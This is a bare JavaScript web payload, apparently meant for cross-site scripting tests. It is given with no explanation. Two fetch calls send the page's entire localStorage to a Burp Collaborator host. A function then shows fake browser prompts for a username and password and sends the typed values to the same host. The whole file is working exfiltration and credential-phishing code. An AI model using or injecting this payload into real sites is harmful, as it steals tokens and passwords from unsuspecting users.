fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?localStorage='+JSON.stringify(localStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {method: "POST", body: JSON.stringify(localStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));

function l() {
  let u = prompt("Username: ", "username");
  let p = prompt("Password: ", "password");
  if (u != null) {
    fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?up='+u+'_'+p, { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
	}
}
l()
